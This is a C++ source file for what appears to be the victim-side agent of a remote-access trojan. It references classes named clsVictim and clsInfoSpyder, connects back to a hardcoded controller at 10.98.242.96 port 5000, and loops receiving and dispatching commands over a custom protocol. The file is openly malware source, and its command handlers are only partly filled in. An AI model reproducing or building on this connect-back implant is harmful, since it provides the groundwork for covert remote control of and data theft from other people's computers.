#include <iostream>
#include <unistd.h>
#include <cstring>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <sstream>
#include <vector>

#include <arpa/inet.h>

///

#include "clsEDP.hpp"
#include "clsInfoSpyder.hpp"
#include "clsTools.hpp"
#include "clsVictim.hpp"

char* g_szIP = "10.98.242.96";
uint16_t g_nPort = 5000;

const int g_nREAD_LENGTH = 65535;

std::ostringstream g_oss;

void fnHandler(int sktSrv)
{
    clsTools g_eztools;
    g_eztools.fnLogInfo("Starting session...");

    int nRecv = 0;
    std::vector<unsigned char> vuStatisRecvBuf(g_nREAD_LENGTH);
    std::vector<unsigned char> vuDynamicRecvBuf;

    clsVictim victim(sktSrv);

    victim.fnSendCmdParam(0, 0);

    do
    {
        std::fill(vuStatisRecvBuf.begin(), vuStatisRecvBuf.end(), 0);
        nRecv = recv(sktSrv, vuStatisRecvBuf.data(), vuStatisRecvBuf.size(), 0);

        if (nRecv <= 0)
            break;

        vuStatisRecvBuf.resize(nRecv);
        vuDynamicRecvBuf.insert(
            vuDynamicRecvBuf.end(),
            vuStatisRecvBuf.begin(),
            vuStatisRecvBuf.end()
        );

        while (vuDynamicRecvBuf.size() >= clsEDP::HEADER_SIZE)
        {
            auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);

            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
                break;

            clsEDP edp(vuDynamicRecvBuf);
            vuDynamicRecvBuf = edp.m_abMoreData();

            std::vector<unsigned char> vuMsg = std::get<3>(edp.fnGetMsg());

            if (nCommand == 0)
            {
                if (nParam == 0)
                {

                }
            }
            else if (nCommand == 1)
            {
                if (nParam == 0)
                {
                    printf("%d\n", nRecv);
                    std::string binStr(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                    g_eztools.fnLogOK(binStr);
                }
            }
        }

    } while (nRecv > 0);

    g_eztools.fnLogInfo("Session is terminated.");
}

int main(int argc, char *argv[])
{
    if (argc == 3)
    {
        clsTools g_eztools;

        g_szIP = argv[1];
        g_nPort = atoi(argv[2]);

        g_oss << "Input host: " << g_szIP << ":" << g_nPort;
        g_eztools.fnLogInfo(g_oss.str());
        g_oss.clear();
    }

    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srvAddr {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(g_nPort);
    inet_pton(AF_INET, g_szIP, &srvAddr.sin_addr);

    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {
        perror("connect");
        return 1;
    }
    else
    {
        fnHandler(sktSrv);
    }

    uint32_t uiKeyLength;
}